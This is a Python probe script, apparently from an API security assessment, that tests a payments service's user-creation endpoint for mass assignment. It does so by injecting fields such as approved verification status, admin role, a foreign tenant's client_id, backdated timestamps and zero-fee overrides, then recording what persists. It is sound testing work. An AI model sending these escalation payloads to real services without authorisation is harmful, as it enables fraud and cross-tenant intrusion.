"""Probe 2 — Mass assignment on POST /v1/users (OWASP API3:2023).

DRIFT-4 showed Kira silently accepts undocumented fields. Now we ask the
sharper question: can an integrator escalate trust state via the create body?

Test matrix:
  T1  verification_status: "APPROVED"
  T2  status: "ACTIVE"
  T3  client_id: <foreign uuid>  (cross-tenant attempt)
  T4  verification_mode: "manual"
  T5  verified_at: "2000-01-01T00:00:00Z"  (backdated)
  T6  eligible_products: [list of all products with eligible=true]
  T7  missing_fields: {}
  T8  is_admin: true / role: "admin"  (privilege escalation guess)
  T9  fee_override: 0 / fees: {percentage: 0}
  T10 id: <attacker-chosen uuid>  (force a chosen id)

For each test we POST a fresh business user with one suspicious field added,
and then GET the user back and compare what the API echoed in the response
body and what's persisted on read.

A 201 + the suspicious field accepted-and-persisted in either response is a
mass-assignment finding.

Run: python3 evidence/work/security/mass-assignment-user-create/probe_mass_assignment.py
"""
from __future__ import annotations

import json
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Tuple

import httpx

HERE = Path(__file__).resolve().parent
WORK = HERE.parents[1]
if str(WORK) not in sys.path:
    sys.path.insert(0, str(WORK))

from _redact import redact_body, redact_headers  # noqa: E402
from run_flow import API_KEY, BASE_URL, auth, fake_business_payload  # noqa: E402


def post_user(token: str, body: Dict[str, Any], label: str) -> Tuple[int, Dict[str, Any]]:
    url = f"{BASE_URL}/v1/users"
    headers = {
        "Content-Type": "application/json",
        "x-api-key": API_KEY,
        "Authorization": f"Bearer {token}",
        "Idempotency-Key": str(uuid.uuid4()),
    }
    t0 = time.perf_counter_ns()
    resp = httpx.post(url, headers=headers, json=body, timeout=30.0)
    elapsed_ms = (time.perf_counter_ns() - t0) / 1e6
    try:
        rb = resp.json()
    except Exception:
        rb = resp.text[:500]
    record = {
        "label": label,
        "url": url,
        "method": "POST",
        "elapsed_ms": round(elapsed_ms, 2),
        "status": resp.status_code,
        "request_headers": redact_headers(headers),
        "request_body": redact_body(body),
        "response_body": redact_body(rb) if isinstance(rb, dict) else rb,
        "response_headers": {k.lower(): v for k, v in resp.headers.items() if k.lower() in ("x-amzn-errortype", "content-type")},
    }
    return resp.status_code, record


def get_user(token: str, user_id: str) -> Dict[str, Any]:
    url = f"{BASE_URL}/v1/users/{user_id}"
    headers = {
        "x-api-key": API_KEY,
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
    }
    t0 = time.perf_counter_ns()
    resp = httpx.get(url, headers=headers, timeout=15.0)
    elapsed_ms = (time.perf_counter_ns() - t0) / 1e6
    try:
        rb = resp.json()
    except Exception:
        rb = resp.text[:500]
    return {
        "url": url,
        "method": "GET",
        "elapsed_ms": round(elapsed_ms, 2),
        "status": resp.status_code,
        "response_body": redact_body(rb) if isinstance(rb, dict) else rb,
    }


# Suspicious overlays to layer onto a fresh business payload
PROBES: List[Tuple[str, Dict[str, Any]]] = [
    ("T1-verification_status-APPROVED", {"verification_status": "APPROVED"}),
    ("T2-status-ACTIVE", {"status": "ACTIVE"}),
    ("T3-foreign-client_id", {"client_id": "00000000-0000-4000-8000-000000000001"}),
    ("T4-verification_mode-manual", {"verification_mode": "manual"}),
    ("T5-verified_at-backdate", {"verified_at": "2000-01-01T00:00:00Z", "kyb_approved_at": "2000-01-01T00:00:00Z"}),
    ("T6-eligible_products-override", {"eligible_products": [
        {"product_code": "usa-virtual-accounts", "eligible": True},
        {"product_code": "payout", "eligible": True},
    ]}),
    ("T7-missing_fields-empty", {"missing_fields": {}, "verification_triggered": True}),
    ("T8-is_admin-role", {"is_admin": True, "role": "admin", "scope": "admin"}),
    ("T9-fee-override", {"fee_override": 0, "fees": {"percentage": 0, "fixed": 0}}),
    ("T10-id-chosen", {"id": "11111111-2222-3333-4444-555555555555"}),
]


def main() -> None:
    token = auth()
    if not token:
        sys.exit(1)

    findings: List[Dict[str, Any]] = []
    for label, overlay in PROBES:
        body = fake_business_payload()
        # Make sure each call has a unique email so it doesn't 409
        body["email"] = f"sec+mass-{label.lower()}-{int(time.time())}-{uuid.uuid4().hex[:6]}@example.com"
        body.update(overlay)

        status, create_record = post_user(token, body, label)
        get_record: Dict[str, Any] = {}
        if status == 201 and isinstance(create_record.get("response_body"), dict):
            uid = create_record["response_body"].get("id")
            if uid and overlay.get("id") != uid:
                # If we tried to force an id, the server didn't honor it (good).
                pass
            if uid:
                # Give the API a moment then GET back
                time.sleep(0.4)
                get_record = get_user(token, uid)

        # Compare: did the API echo back the suspicious field with our value?
        echoed = {}
        persisted = {}
        for k, v in overlay.items():
            rb = create_record.get("response_body")
            if isinstance(rb, dict) and k in rb:
                echoed[k] = {"sent": v, "echoed": rb[k]}
            gb = get_record.get("response_body") if get_record else None
            if isinstance(gb, dict) and k in gb:
                persisted[k] = {"sent": v, "persisted": gb[k]}

        # Heuristic: did the privilege escalation succeed?
        # - For verification_status: SAFE if response shows "unverified" / NOT_STARTED, regardless of what we sent.
        # - For client_id: SAFE if it isn't echoed at all.
        # - For id: SAFE if response id != requested id.
        finding = {
            "label": label,
            "overlay": overlay,
            "create_status": status,
            "echoed_in_create_response": echoed,
            "persisted_in_get_response": persisted,
            "evaluated": {
                "verification_status_in_response": (create_record.get("response_body") or {}).get("verification_status") if isinstance(create_record.get("response_body"), dict) else None,
                "status_in_response": (create_record.get("response_body") or {}).get("status") if isinstance(create_record.get("response_body"), dict) else None,
                "verification_triggered_in_response": (create_record.get("response_body") or {}).get("verification_triggered") if isinstance(create_record.get("response_body"), dict) else None,
            },
        }
        findings.append({"finding": finding, "create_record": create_record, "get_record": get_record})

    summary = {
        "captured_at": datetime.now(timezone.utc).isoformat(),
        "probes": findings,
    }
    out = HERE / "01-mass-assignment-results.json"
    out.write_text(json.dumps(summary, indent=2))
    print("Probe 2 output:", out)
    for f in findings:
        fnd = f["finding"]
        print(f"  {fnd['label']}: create={fnd['create_status']} "
              f"vs={fnd['evaluated']['verification_status_in_response']} "
              f"s={fnd['evaluated']['status_in_response']} "
              f"vt={fnd['evaluated']['verification_triggered_in_response']} "
              f"echoed_keys={list(fnd['echoed_in_create_response'].keys())}")


if __name__ == "__main__":
    main()
